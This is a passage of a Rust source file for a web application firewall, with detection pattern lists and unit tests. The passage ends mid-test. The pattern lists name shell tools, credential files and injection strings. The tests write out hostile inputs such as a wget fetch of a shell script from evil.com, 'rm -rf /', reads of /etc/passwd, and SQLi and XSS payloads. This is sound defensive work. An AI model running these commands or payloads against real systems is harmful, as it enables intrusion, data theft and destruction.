#![warn(clippy::all, clippy::pedantic, clippy::nursery)]
#![allow(clippy::module_name_repetitions, clippy::struct_excessive_bools)]

//! ALICE-WAF: Web Application Firewall
//!
//! Pure Rust WAF with rule engine, SQL injection detection, XSS detection,
//! IP allowlist/blocklist, rate limiting, request inspection, and OWASP patterns.

use std::collections::HashMap;
use std::net::IpAddr;
use std::sync::Mutex;
use std::time::{Duration, Instant};

// ---------------------------------------------------------------------------
// Action
// ---------------------------------------------------------------------------

/// Action to take when a rule matches.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Action {
    /// Block the request.
    Block,
    /// Allow the request.
    Allow,
    /// Log the request but do not block.
    Log,
}

// ---------------------------------------------------------------------------
// Verdict
// ---------------------------------------------------------------------------

/// Result of WAF inspection.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Verdict {
    pub action: Action,
    pub matched_rule: Option<String>,
    pub reason: Option<String>,
}

impl Verdict {
    #[must_use]
    pub const fn allow() -> Self {
        Self {
            action: Action::Allow,
            matched_rule: None,
            reason: None,
        }
    }

    #[must_use]
    pub fn block(rule: &str, reason: &str) -> Self {
        Self {
            action: Action::Block,
            matched_rule: Some(rule.to_owned()),
            reason: Some(reason.to_owned()),
        }
    }

    #[must_use]
    pub fn log(rule: &str, reason: &str) -> Self {
        Self {
            action: Action::Log,
            matched_rule: Some(rule.to_owned()),
            reason: Some(reason.to_owned()),
        }
    }
}

// ---------------------------------------------------------------------------
// Request
// ---------------------------------------------------------------------------

/// Represents an incoming HTTP request to inspect.
#[derive(Debug, Clone)]
pub struct Request {
    pub method: String,
    pub uri: String,
    pub headers: HashMap<String, String>,
    pub body: String,
    pub source_ip: Option<IpAddr>,
}

impl Request {
    #[must_use]
    pub fn new(method: &str, uri: &str) -> Self {
        Self {
            method: method.to_owned(),
            uri: uri.to_owned(),
            headers: HashMap::new(),
            body: String::new(),
            source_ip: None,
        }
    }

    #[must_use]
    pub fn with_header(mut self, key: &str, value: &str) -> Self {
        self.headers.insert(key.to_lowercase(), value.to_owned());
        self
    }

    #[must_use]
    pub fn with_body(mut self, body: &str) -> Self {
        body.clone_into(&mut self.body);
        self
    }

    #[must_use]
    pub const fn with_ip(mut self, ip: IpAddr) -> Self {
        self.source_ip = Some(ip);
        self
    }
}

// ---------------------------------------------------------------------------
// Rule
// ---------------------------------------------------------------------------

/// Target field for rule matching.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RuleTarget {
    Uri,
    Body,
    Header(String),
    Method,
    AnyField,
}

/// A single WAF rule.
#[derive(Debug, Clone)]
pub struct Rule {
    pub id: String,
    pub description: String,
    pub target: RuleTarget,
    pub pattern: Pattern,
    pub action: Action,
    pub priority: u32,
    pub enabled: bool,
}

/// Pattern matching strategy.
#[derive(Debug, Clone)]
pub enum Pattern {
    Contains(String),
    ContainsCaseInsensitive(String),
    Exact(String),
    StartsWith(String),
    EndsWith(String),
    AnyOf(Vec<String>),
    Custom(fn(&str) -> bool),
}

impl Pattern {
    fn matches(&self, input: &str) -> bool {
        match self {
            Self::Contains(p) => input.contains(p.as_str()),
            Self::ContainsCaseInsensitive(p) => input.to_lowercase().contains(&p.to_lowercase()),
            Self::Exact(p) => input == p,
            Self::StartsWith(p) => input.starts_with(p.as_str()),
            Self::EndsWith(p) => input.ends_with(p.as_str()),
            Self::AnyOf(patterns) => patterns
                .iter()
                .any(|p| input.to_lowercase().contains(&p.to_lowercase())),
            Self::Custom(f) => f(input),
        }
    }
}

impl Rule {
    fn check(&self, request: &Request) -> bool {
        if !self.enabled {
            return false;
        }
        match &self.target {
            RuleTarget::Uri => self.pattern.matches(&request.uri),
            RuleTarget::Body => self.pattern.matches(&request.body),
            RuleTarget::Header(name) => request
                .headers
                .get(&name.to_lowercase())
                .is_some_and(|v| self.pattern.matches(v)),
            RuleTarget::Method => self.pattern.matches(&request.method),
            RuleTarget::AnyField => {
                self.pattern.matches(&request.uri)
                    || self.pattern.matches(&request.body)
                    || request.headers.values().any(|v| self.pattern.matches(v))
            }
        }
    }
}

// ---------------------------------------------------------------------------
// SQL Injection Detection
// ---------------------------------------------------------------------------

/// SQL injection detection patterns.
const SQLI_PATTERNS: &[&str] = &[
    "' or '1'='1",
    "' or 1=1",
    "'; drop table",
    "'; delete from",
    "'; insert into",
    "'; update ",
    "union select",
    "union all select",
    "select * from",
    "select count(",
    "1=1--",
    "1=1#",
    "' or ''='",
    "' or 'a'='a",
    "') or ('1'='1",
    "admin'--",
    "'; exec ",
    "'; execute ",
    "; drop table",
    "' and 1=1",
    "' and '1'='1",
    "order by 1--",
    "group by 1--",
    "having 1=1",
    "benchmark(",
    "sleep(",
    "waitfor delay",
    "load_file(",
    "into outfile",
    "into dumpfile",
    "information_schema",
    "table_name",
    "column_name",
    "concat(",
    "char(",
    "0x",
];

/// Check if input contains SQL injection patterns.
#[must_use]
pub fn detect_sqli(input: &str) -> Option<&'static str> {
    let lower = input.to_lowercase();
    SQLI_PATTERNS
        .iter()
        .find(|&&pattern| lower.contains(pattern))
        .copied()
        .map(|v| v as _)
}

// ---------------------------------------------------------------------------
// XSS Detection
// ---------------------------------------------------------------------------

/// XSS detection patterns.
const XSS_PATTERNS: &[&str] = &[
    "<script",
    "</script>",
    "javascript:",
    "onerror=",
    "onload=",
    "onclick=",
    "onmouseover=",
    "onfocus=",
    "onblur=",
    "onsubmit=",
    "onchange=",
    "onkeydown=",
    "onkeyup=",
    "onkeypress=",
    "ondblclick=",
    "onmouseout=",
    "onmousedown=",
    "onmouseup=",
    "onmousemove=",
    "onresize=",
    "onscroll=",
    "onunload=",
    "<iframe",
    "<object",
    "<embed",
    "<applet",
    "<form",
    "<img src=",
    "expression(",
    "vbscript:",
    "data:text/html",
    "alert(",
    "confirm(",
    "prompt(",
    "document.cookie",
    "document.write",
    "document.domain",
    "window.location",
    "eval(",
    "settimeout(",
    "setinterval(",
    "innerhtml",
    "outerhtml",
    "textcontent",
    "addeventlistener",
    "fromcharcode",
];

/// Check if input contains XSS patterns.
#[must_use]
pub fn detect_xss(input: &str) -> Option<&'static str> {
    let lower = input.to_lowercase();
    XSS_PATTERNS
        .iter()
        .find(|&&pattern| lower.contains(pattern))
        .copied()
        .map(|v| v as _)
}

// ---------------------------------------------------------------------------
// OWASP Patterns (Command Injection, Path Traversal, etc.)
// ---------------------------------------------------------------------------

const CMD_INJECTION_PATTERNS: &[&str] = &[
    "; ls",
    "; cat ",
    "; rm ",
    "| ls",
    "| cat ",
    "| rm ",
    "$(", // command substitution
    "`",  // backtick execution
    "; wget ",
    "; curl ",
    "| wget ",
    "| curl ",
    "; chmod ",
    "; chown ",
    "&& ls",
    "&& cat",
    "&& rm",
    "|| ls",
    "|| cat",
    "|| rm",
    "; nc ",
    "; netcat ",
    "; python ",
    "; perl ",
    "; ruby ",
    "; bash ",
    "; sh ",
    "/bin/sh",
    "/bin/bash",
    "cmd.exe",
    "powershell",
];

const PATH_TRAVERSAL_PATTERNS: &[&str] = &[
    "../",
    "..\\",
    "%2e%2e%2f",
    "%2e%2e/",
    "..%2f",
    "%2e%2e%5c",
    "..%5c",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "c:\\windows",
    "c:/windows",
    "/proc/self",
    "/dev/null",
];

const HEADER_INJECTION_PATTERNS: &[&str] = &["\r\n", "%0d%0a", "%0d", "%0a", "\\r\\n"];

/// Check for command injection.
#[must_use]
pub fn detect_command_injection(input: &str) -> Option<&'static str> {
    let lower = input.to_lowercase();
    CMD_INJECTION_PATTERNS
        .iter()
        .find(|&&pattern| lower.contains(pattern))
        .copied()
        .map(|v| v as _)
}

/// Check for path traversal.
#[must_use]
pub fn detect_path_traversal(input: &str) -> Option<&'static str> {
    let lower = input.to_lowercase();
    PATH_TRAVERSAL_PATTERNS
        .iter()
        .find(|&&pattern| lower.contains(pattern))
        .copied()
        .map(|v| v as _)
}

/// Check for header injection.
#[must_use]
pub fn detect_header_injection(input: &str) -> Option<&'static str> {
    let lower = input.to_lowercase();
    HEADER_INJECTION_PATTERNS
        .iter()
        .find(|&&pattern| lower.contains(pattern))
        .copied()
        .map(|v| v as _)
}

// ---------------------------------------------------------------------------
// IP Filter
// ---------------------------------------------------------------------------

/// IP-based allow/block list.
#[derive(Debug, Clone, Default)]
pub struct IpFilter {
    allowlist: Vec<IpAddr>,
    blocklist: Vec<IpAddr>,
    /// If true, only IPs in the allowlist are permitted.
    allowlist_only: bool,
}

impl IpFilter {
    #[must_use]
    pub fn new() -> Self {
        Self::default()
    }

    pub fn add_to_allowlist(&mut self, ip: IpAddr) {
        if !self.allowlist.contains(&ip) {
            self.allowlist.push(ip);
        }
    }

    pub fn add_to_blocklist(&mut self, ip: IpAddr) {
        if !self.blocklist.contains(&ip) {
            self.blocklist.push(ip);
        }
    }

    pub fn remove_from_allowlist(&mut self, ip: &IpAddr) {
        self.allowlist.retain(|a| a != ip);
    }

    pub fn remove_from_blocklist(&mut self, ip: &IpAddr) {
        self.blocklist.retain(|a| a != ip);
    }

    pub const fn set_allowlist_only(&mut self, enabled: bool) {
        self.allowlist_only = enabled;
    }

    /// Check whether the given IP is permitted.
    #[must_use]
    pub fn check(&self, ip: &IpAddr) -> Action {
        // Blocklist always wins.
        if self.blocklist.contains(ip) {
            return Action::Block;
        }
        // In allowlist-only mode, reject unlisted IPs.
        if self.allowlist_only && !self.allowlist.contains(ip) {
            return Action::Block;
        }
        Action::Allow
    }

    #[must_use]
    pub fn is_blocked(&self, ip: &IpAddr) -> bool {
        self.blocklist.contains(ip)
    }

    #[must_use]
    pub fn is_allowed(&self, ip: &IpAddr) -> bool {
        self.allowlist.contains(ip)
    }
}

// ---------------------------------------------------------------------------
// Rate Limiter
// ---------------------------------------------------------------------------

/// Token-bucket rate limiter keyed by IP address.
pub struct RateLimiter {
    /// Maximum tokens (requests) per window.
    max_tokens: u32,
    /// Window duration.
    window: Duration,
    /// Per-IP state.
    buckets: Mutex<HashMap<IpAddr, TokenBucket>>,
}

struct TokenBucket {
    tokens: u32,
    last_refill: Instant,
}

impl RateLimiter {
    #[must_use]
    pub fn new(max_requests: u32, window: Duration) -> Self {
        Self {
            max_tokens: max_requests,
            window,
            buckets: Mutex::new(HashMap::new()),
        }
    }

    /// Try to consume one token. Returns `true` if the request is allowed.
    pub fn allow(&self, ip: &IpAddr) -> bool {
        let now = Instant::now();
        let max = self.max_tokens;
        let window = self.window;
        let mut buckets = self
            .buckets
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        let bucket = buckets.entry(*ip).or_insert_with(|| TokenBucket {
            tokens: max,
            last_refill: now,
        });

        // Refill if window has elapsed.
        if now.duration_since(bucket.last_refill) >= window {
            bucket.tokens = max;
            bucket.last_refill = now;
        }

        let result = if bucket.tokens > 0 {
            bucket.tokens -= 1;
            true
        } else {
            false
        };
        drop(buckets);
        result
    }

    /// Return the number of remaining tokens for an IP.
    pub fn remaining(&self, ip: &IpAddr) -> u32 {
        let buckets = self
            .buckets
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        buckets.get(ip).map_or(self.max_tokens, |b| b.tokens)
    }

    /// Reset all buckets.
    pub fn reset(&self) {
        let mut buckets = self
            .buckets
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        buckets.clear();
    }
}

// ---------------------------------------------------------------------------
// Request Inspector
// ---------------------------------------------------------------------------

/// Content-type validation result.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ContentTypeCheck {
    Valid,
    Missing,
    Invalid(String),
}

/// Inspect request properties.
pub struct RequestInspector {
    /// Maximum allowed body size in bytes.
    pub max_body_size: usize,
    /// Allowed HTTP methods.
    pub allowed_methods: Vec<String>,
    /// Required headers.
    pub required_headers: Vec<String>,
    /// Allowed content types.
    pub allowed_content_types: Vec<String>,
}

impl Default for RequestInspector {
    fn default() -> Self {
        Self {
            max_body_size: 1_048_576, // 1 MB
            allowed_methods: vec![
                "GET".into(),
                "POST".into(),
                "PUT".into(),
                "DELETE".into(),
                "PATCH".into(),
                "HEAD".into(),
                "OPTIONS".into(),
            ],
            required_headers: Vec::new(),
            allowed_content_types: Vec::new(),
        }
    }
}

impl RequestInspector {
    #[must_use]
    pub fn new() -> Self {
        Self::default()
    }

    /// Check if the method is allowed.
    #[must_use]
    pub fn check_method(&self, method: &str) -> bool {
        self.allowed_methods
            .iter()
            .any(|m| m.eq_ignore_ascii_case(method))
    }

    /// Check if the body size is within limits.
    #[must_use]
    pub const fn check_body_size(&self, body: &str) -> bool {
        body.len() <= self.max_body_size
    }

    /// Check if all required headers are present.
    #[must_use]
    pub fn check_required_headers(&self, headers: &HashMap<String, String>) -> Vec<String> {
        self.required_headers
            .iter()
            .filter(|h| !headers.contains_key(&h.to_lowercase()))
            .cloned()
            .collect()
    }

    /// Validate content-type header.
    #[must_use]
    pub fn check_content_type(&self, headers: &HashMap<String, String>) -> ContentTypeCheck {
        if self.allowed_content_types.is_empty() {
            return ContentTypeCheck::Valid;
        }
        headers
            .get("content-type")
            .map_or(ContentTypeCheck::Missing, |ct| {
                let ct_lower = ct.to_lowercase();
                if self
                    .allowed_content_types
                    .iter()
                    .any(|a| ct_lower.contains(&a.to_lowercase()))
                {
                    ContentTypeCheck::Valid
                } else {
                    ContentTypeCheck::Invalid(ct.clone())
                }
            })
    }
}

// ---------------------------------------------------------------------------
// WAF Engine
// ---------------------------------------------------------------------------

/// The main WAF engine.
pub struct Waf {
    rules: Vec<Rule>,
    ip_filter: IpFilter,
    rate_limiter: Option<RateLimiter>,
    inspector: RequestInspector,
    /// Enable built-in `SQLi` detection.
    pub sqli_detection: bool,
    /// Enable built-in XSS detection.
    pub xss_detection: bool,
    /// Enable built-in command injection detection.
    pub cmd_injection_detection: bool,
    /// Enable built-in path traversal detection.
    pub path_traversal_detection: bool,
    /// Enable built-in header injection detection.
    pub header_injection_detection: bool,
}

impl Default for Waf {
    fn default() -> Self {
        Self::new()
    }
}

impl Waf {
    #[must_use]
    pub fn new() -> Self {
        Self {
            rules: Vec::new(),
            ip_filter: IpFilter::new(),
            rate_limiter: None,
            inspector: RequestInspector::new(),
            sqli_detection: true,
            xss_detection: true,
            cmd_injection_detection: true,
            path_traversal_detection: true,
            header_injection_detection: true,
        }
    }

    pub fn add_rule(&mut self, rule: Rule) {
        self.rules.push(rule);
        self.rules.sort_by(|a, b| a.priority.cmp(&b.priority));
    }

    pub fn remove_rule(&mut self, id: &str) {
        self.rules.retain(|r| r.id != id);
    }

    #[must_use]
    pub const fn ip_filter(&self) -> &IpFilter {
        &self.ip_filter
    }

    pub const fn ip_filter_mut(&mut self) -> &mut IpFilter {
        &mut self.ip_filter
    }

    pub fn set_rate_limiter(&mut self, limiter: RateLimiter) {
        self.rate_limiter = Some(limiter);
    }

    #[must_use]
    pub const fn inspector(&self) -> &RequestInspector {
        &self.inspector
    }

    pub const fn inspector_mut(&mut self) -> &mut RequestInspector {
        &mut self.inspector
    }

    /// Inspect a request and return a verdict.
    pub fn inspect(&self, request: &Request) -> Verdict {
        // 1. IP filter
        if let Some(ip) = &request.source_ip {
            let ip_action = self.ip_filter.check(ip);
            if ip_action == Action::Block {
                return Verdict::block("ip-filter", "IP address is blocked");
            }
        }

        // 2. Rate limiting
        if let Some(ref limiter) = self.rate_limiter {
            if let Some(ip) = &request.source_ip {
                if !limiter.allow(ip) {
                    return Verdict::block("rate-limit", "Rate limit exceeded");
                }
            }
        }

        // 3. Method check
        if !self.inspector.check_method(&request.method) {
            return Verdict::block("method-check", "HTTP method not allowed");
        }

        // 4. Body size check
        if !self.inspector.check_body_size(&request.body) {
            return Verdict::block("body-size", "Request body too large");
        }

        // 5. Required headers
        let missing = self.inspector.check_required_headers(&request.headers);
        if !missing.is_empty() {
            return Verdict::block(
                "required-headers",
                &format!("Missing required headers: {}", missing.join(", ")),
            );
        }

        // 6. Content-type
        match self.inspector.check_content_type(&request.headers) {
            ContentTypeCheck::Missing if !self.inspector.allowed_content_types.is_empty() => {
                return Verdict::block("content-type", "Missing Content-Type header");
            }
            ContentTypeCheck::Invalid(ct) => {
                return Verdict::block("content-type", &format!("Content-Type not allowed: {ct}"));
            }
            _ => {}
        }

        // 7. Built-in detections (check URI + body + header values)
        let fields_to_check = Self::collect_fields(request);

        for field in &fields_to_check {
            if self.sqli_detection {
                if let Some(pattern) = detect_sqli(field) {
                    return Verdict::block("sqli", &format!("SQL injection detected: {pattern}"));
                }
            }
            if self.xss_detection {
                if let Some(pattern) = detect_xss(field) {
                    return Verdict::block("xss", &format!("XSS detected: {pattern}"));
                }
            }
            if self.cmd_injection_detection {
                if let Some(pattern) = detect_command_injection(field) {
                    return Verdict::block(
                        "cmd-injection",
                        &format!("Command injection detected: {pattern}"),
                    );
                }
            }
            if self.path_traversal_detection {
                if let Some(pattern) = detect_path_traversal(field) {
                    return Verdict::block(
                        "path-traversal",
                        &format!("Path traversal detected: {pattern}"),
                    );
                }
            }
            if self.header_injection_detection {
                if let Some(pattern) = detect_header_injection(field) {
                    return Verdict::block(
                        "header-injection",
                        &format!("Header injection detected: {pattern}"),
                    );
                }
            }
        }

        // 8. Custom rules (sorted by priority)
        for rule in &self.rules {
            if rule.check(request) {
                match rule.action {
                    Action::Block => {
                        return Verdict::block(&rule.id, &rule.description);
                    }
                    Action::Log => {
                        return Verdict::log(&rule.id, &rule.description);
                    }
                    Action::Allow => {
                        return Verdict::allow();
                    }
                }
            }
        }

        Verdict::allow()
    }

    fn collect_fields(request: &Request) -> Vec<String> {
        let mut fields = vec![request.uri.clone(), request.body.clone()];
        for value in request.headers.values() {
            fields.push(value.clone());
        }
        fields
    }

    /// Return the number of rules.
    #[must_use]
    pub const fn rule_count(&self) -> usize {
        self.rules.len()
    }
}

// ===========================================================================
// Tests
// ===========================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::{Ipv4Addr, Ipv6Addr};

    // -----------------------------------------------------------------------
    // Action & Verdict
    // -----------------------------------------------------------------------

    #[test]
    fn verdict_allow_has_no_rule() {
        let v = Verdict::allow();
        assert_eq!(v.action, Action::Allow);
        assert!(v.matched_rule.is_none());
        assert!(v.reason.is_none());
    }

    #[test]
    fn verdict_block_has_rule_and_reason() {
        let v = Verdict::block("r1", "bad");
        assert_eq!(v.action, Action::Block);
        assert_eq!(v.matched_rule.as_deref(), Some("r1"));
        assert_eq!(v.reason.as_deref(), Some("bad"));
    }

    #[test]
    fn verdict_log_has_rule_and_reason() {
        let v = Verdict::log("r2", "suspicious");
        assert_eq!(v.action, Action::Log);
        assert_eq!(v.matched_rule.as_deref(), Some("r2"));
    }

    // -----------------------------------------------------------------------
    // Request builder
    // -----------------------------------------------------------------------

    #[test]
    fn request_builder() {
        let r = Request::new("POST", "/api")
            .with_header("Content-Type", "application/json")
            .with_body("{}")
            .with_ip(IpAddr::V4(Ipv4Addr::LOCALHOST));
        assert_eq!(r.method, "POST");
        assert_eq!(r.uri, "/api");
        assert_eq!(r.body, "{}");
        assert!(r.source_ip.is_some());
        assert_eq!(r.headers.get("content-type").unwrap(), "application/json");
    }

    // -----------------------------------------------------------------------
    // SQL Injection Detection
    // -----------------------------------------------------------------------

    #[test]
    fn sqli_or_1_eq_1() {
        assert!(detect_sqli("' OR '1'='1").is_some());
    }

    #[test]
    fn sqli_union_select() {
        assert!(detect_sqli("1 UNION SELECT * FROM users").is_some());
    }

    #[test]
    fn sqli_drop_table() {
        assert!(detect_sqli("'; DROP TABLE users--").is_some());
    }

    #[test]
    fn sqli_delete_from() {
        assert!(detect_sqli("'; DELETE FROM users--").is_some());
    }

    #[test]
    fn sqli_insert_into() {
        assert!(detect_sqli("'; INSERT INTO users VALUES('x')").is_some());
    }

    #[test]
    fn sqli_benchmark() {
        assert!(detect_sqli("1 AND BENCHMARK(10000000,SHA1('test'))").is_some());
    }

    #[test]
    fn sqli_sleep() {
        assert!(detect_sqli("1 AND SLEEP(5)").is_some());
    }

    #[test]
    fn sqli_information_schema() {
        assert!(detect_sqli("SELECT * FROM information_schema.tables").is_some());
    }

    #[test]
    fn sqli_load_file() {
        assert!(detect_sqli("LOAD_FILE('/etc/passwd')").is_some());
    }

    #[test]
    fn sqli_into_outfile() {
        assert!(detect_sqli("SELECT * INTO OUTFILE '/tmp/x'").is_some());
    }

    #[test]
    fn sqli_clean_input() {
        assert!(detect_sqli("SELECT name FROM products WHERE id=5").is_none());
    }

    #[test]
    fn sqli_normal_text() {
        assert!(detect_sqli("Hello world, this is normal text").is_none());
    }

    #[test]
    fn sqli_order_by() {
        assert!(detect_sqli("1 ORDER BY 1--").is_some());
    }

    #[test]
    fn sqli_having() {
        assert!(detect_sqli("1 HAVING 1=1").is_some());
    }

    #[test]
    fn sqli_waitfor() {
        assert!(detect_sqli("'; WAITFOR DELAY '00:00:05'").is_some());
    }

    #[test]
    fn sqli_concat() {
        assert!(detect_sqli("CONCAT(username, password)").is_some());
    }

    #[test]
    fn sqli_char() {
        assert!(detect_sqli("CHAR(60,115,99)").is_some());
    }

    #[test]
    fn sqli_hex() {
        assert!(detect_sqli("0x414243").is_some());
    }

    // -----------------------------------------------------------------------
    // XSS Detection
    // -----------------------------------------------------------------------

    #[test]
    fn xss_script_tag() {
        assert!(detect_xss("<script>alert('xss')</script>").is_some());
    }

    #[test]
    fn xss_onerror() {
        assert!(detect_xss("<img onerror=alert(1) src=x>").is_some());
    }

    #[test]
    fn xss_onload() {
        assert!(detect_xss("<body onload=alert(1)>").is_some());
    }

    #[test]
    fn xss_javascript_uri() {
        assert!(detect_xss("javascript:alert(1)").is_some());
    }

    #[test]
    fn xss_iframe() {
        assert!(detect_xss("<iframe src='evil.com'>").is_some());
    }

    #[test]
    fn xss_document_cookie() {
        assert!(detect_xss("document.cookie").is_some());
    }

    #[test]
    fn xss_document_write() {
        assert!(detect_xss("document.write('<h1>hi</h1>')").is_some());
    }

    #[test]
    fn xss_eval() {
        assert!(detect_xss("eval('alert(1)')").is_some());
    }

    #[test]
    fn xss_innerhtml() {
        assert!(detect_xss("el.innerHTML = '<img>'").is_some());
    }

    #[test]
    fn xss_fromcharcode() {
        assert!(detect_xss("String.fromCharCode(60,115)").is_some());
    }

    #[test]
    fn xss_vbscript() {
        assert!(detect_xss("vbscript:msgbox").is_some());
    }

    #[test]
    fn xss_data_text_html() {
        assert!(detect_xss("data:text/html,<script>alert(1)</script>").is_some());
    }

    #[test]
    fn xss_onclick() {
        assert!(detect_xss("<div onclick=alert(1)>").is_some());
    }

    #[test]
    fn xss_onmouseover() {
        assert!(detect_xss("<a onmouseover=alert(1)>link</a>").is_some());
    }

    #[test]
    fn xss_settimeout() {
        assert!(detect_xss("setTimeout('alert(1)',0)").is_some());
    }

    #[test]
    fn xss_clean_input() {
        assert!(detect_xss("Hello, this is normal HTML content").is_none());
    }

    #[test]
    fn xss_object_tag() {
        assert!(detect_xss("<object data='evil.swf'>").is_some());
    }

    #[test]
    fn xss_embed_tag() {
        assert!(detect_xss("<embed src='evil.swf'>").is_some());
    }

    // -----------------------------------------------------------------------
    // Command Injection Detection
    // -----------------------------------------------------------------------

    #[test]
    fn cmd_injection_semicolon_ls() {
        assert!(detect_command_injection("; ls -la").is_some());
    }

    #[test]
    fn cmd_injection_pipe_cat() {
        assert!(detect_command_injection("| cat /etc/passwd").is_some());
    }

    #[test]
    fn cmd_injection_dollar_paren() {
        assert!(detect_command_injection("$(whoami)").is_some());
    }

    #[test]
    fn cmd_injection_backtick() {
        assert!(detect_command_injection("`id`").is_some());
    }

    #[test]
    fn cmd_injection_wget() {
        assert!(detect_command_injection("; wget evil.com/shell.sh").is_some());
    }

    #[test]
    fn cmd_injection_bin_sh() {
        assert!(detect_command_injection("/bin/sh -c 'ls'").is_some());
    }

    #[test]
    fn cmd_injection_powershell() {
        assert!(detect_command_injection("powershell -exec bypass").is_some());
    }

    #[test]
    fn cmd_injection_clean() {
        assert!(detect_command_injection("normal user input").is_none());
    }

    #[test]
    fn cmd_injection_and_and_rm() {
        assert!(detect_command_injection("&& rm -rf /").is_some());
    }

    #[test]
    fn cmd_injection_python() {
        assert!(detect_command_injection("; python -c 'import os'").is_some());
    }

    // -----------------------------------------------------------------------
    // Path Traversal Detection
    // -----------------------------------------------------------------------

    #[test]
    fn path_traversal_dot_dot_slash() {
        assert!(detect_path_traversal("../../etc/passwd").is_some());
    }

    #[test]
    fn path_traversal_encoded() {
        assert!(detect_path_traversal("%2e%2e%2f%2e%2e%2fetc/passwd").is_some());
    }

    #[test]
    fn path_traversal_etc_passwd() {
        assert!(detect_path_traversal("/etc/passwd").is_some());
    }

    #[test]
    fn path_traversal_etc_shadow() {
        assert!(detect_path_traversal("/etc/shadow").is_some());
    }

    #[test]
    fn path_traversal_windows() {
        assert!(detect_path_traversal("c:\\windows\\system32").is_some());
    }

    #[test]
    fn path_traversal_proc_self() {
        assert!(detect_path_traversal("/proc/self/environ").is_some());
    }

    #[test]
    fn path_traversal_clean() {
        assert!(detect_path_traversal("/api/users/123").is_none());
    }

    // -----------------------------------------------------------------------
    // Header Injection Detection
    // -----------------------------------------------------------------------

    #[test]
    fn header_injection_crlf() {
        assert!(detect_header_injection("value\r\nSet-Cookie: evil").is_some());
    }

    #[test]
    fn header_injection_encoded() {
        assert!(detect_header_injection("value%0d%0aSet-Cookie: evil").is_some());
    }

    #[test]
    fn header_injection_clean() {
        assert!(detect_header_injection("normal-header-value").is_none());
    }

    // -----------------------------------------------------------------------
    // IP Filter
    // -----------------------------------------------------------------------

    #[test]
    fn ip_filter_blocklist() {
        let mut f = IpFilter::new();
        let ip: IpAddr = "192.168.1.100".parse().unwrap();
        f.add_to_blocklist(ip);
        assert_eq!(f.check(&ip), Action::Block);
        assert!(f.is_blocked(&ip));
    }

    #[test]
    fn ip_filter_allowlist_only() {
        let mut f = IpFilter::new();
        let allowed: IpAddr = "10.0.0.1".parse().unwrap();
        let other: IpAddr = "10.0.0.2".parse().unwrap();
        f.add_to_allowlist(allowed);
        f.set_allowlist_only(true);
        assert_eq!(f.check(&allowed), Action::Allow);
        assert_eq!(f.check(&other), Action::Block);
    }

    #[test]
    fn ip_filter_blocklist_overrides_allowlist() {
        let mut f = IpFilter::new();
        let ip: IpAddr = "10.0.0.1".parse().unwrap();
        f.add_to_allowlist(ip);
        f.add_to_blocklist(ip);
        f.set_allowlist_only(true);
        assert_eq!(f.check(&ip), Action::Block);
    }

    #[test]
    fn ip_filter_remove_from_blocklist() {
        let mut f = IpFilter::new();
        let ip: IpAddr = "1.2.3.4".parse().unwrap();
        f.add_to_blocklist(ip);
        assert!(f.is_blocked(&ip));
        f.remove_from_blocklist(&ip);
        assert!(!f.is_blocked(&ip));
    }

    #[test]
    fn ip_filter_remove_from_allowlist() {
        let mut f = IpFilter::new();
        let ip: IpAddr = "1.2.3.4".parse().unwrap();
        f.add_to_allowlist(ip);
        assert!(f.is_allowed(&ip));
        f.remove_from_allowlist(&ip);
        assert!(!f.is_allowed(&ip));
    }

    #[test]
    fn ip_filter_ipv6() {
        let mut f = IpFilter::new();
        let ip = IpAddr::V6(Ipv6Addr::new(0x2001, 0xdb8, 0, 0, 0, 0, 0, 1));
        f.add_to_blocklist(ip);
        assert_eq!(f.check(&ip), Action::Block);
    }

    #[test]
    fn ip_filter_no_duplicate_add() {
        let mut f = IpFilter::new();
        let ip: IpAddr = "1.2.3.4".parse().unwrap();
        f.add_to_blocklist(ip);
        f.add_to_blocklist(ip);
        assert_eq!(f.blocklist.len(), 1);
    }

    // -----------------------------------------------------------------------
    // Rate Limiter
    // -----------------------------------------------------------------------

    #[test]
    fn rate_limiter_allows_within_limit() {
        let limiter = RateLimiter::new(5, Duration::from_secs(60));
        let ip: IpAddr = "10.0.0.1".parse().unwrap();
        for _ in 0..5 {
            assert!(limiter.allow(&ip));
        }
    }

    #[test]
    fn rate_limiter_blocks_over_limit() {
        let limiter = RateLimiter::new(3, Duration::from_secs(60));
        let ip: IpAddr = "10.0.0.1".parse().unwrap();
        for _ in 0..3 {
            assert!(limiter.allow(&ip));
        }
        assert!(!limiter.allow(&ip));
    }

    #[test]
    fn rate_limiter_independent_ips() {
        let limiter = RateLimiter::new(2, Duration::from_secs(60));
        let ip1: IpAddr = "10.0.0.1".parse().unwrap();
        let ip2: IpAddr = "10.0.0.2".parse().unwrap();
        assert!(limiter.allow(&ip1));
        assert!(limiter.allow(&ip1));
        assert!(!limiter.allow(&ip1));
        assert!(limiter.allow(&ip2));
    }

    #[test]
    fn rate_limiter_remaining() {
        let limiter = RateLimiter::new(5, Duration::from_secs(60));
        let ip: IpAddr = "10.0.0.1".parse().unwrap();
        assert_eq!(limiter.remaining(&ip), 5);
        limiter.allow(&ip);
        assert_eq!(limiter.remaining(&ip), 4);
    }

    #[test]
    fn rate_limiter_reset() {
        let limiter = RateLimiter::new(2, Duration::from_secs(60));
        let ip: IpAddr = "10.0.0.1".parse().unwrap();
        limiter.allow(&ip);
        limiter.allow(&ip);
        assert!(!limiter.allow(&ip));
        limiter.reset();
        assert!(limiter.allow(&ip));
    }

    // -----------------------------------------------------------------------
    // Request Inspector
    // -----------------------------------------------------------------------

    #[test]
    fn inspector_default_methods() {
        let i = RequestInspector::new();
        assert!(i.check_method("GET"));
        assert!(i.check_method("POST"));
        assert!(i.check_method("put")); // case insensitive
        assert!(!i.check_method("CUSTOM"));
    }

    #[test]
    fn inspector_body_size() {
        let mut i = RequestInspector::new();
        i.max_body_size = 10;
        assert!(i.check_body_size("short"));
        assert!(!i.check_body_size("this is definitely over ten bytes"));
    }

    #[test]
    fn inspector_required_headers() {
        let mut i = RequestInspector::new();
        i.required_headers = vec!["authorization".into(), "x-request-id".into()];
        let mut headers = HashMap::new();
        headers.insert("authorization".into(), "Bearer xxx".into());
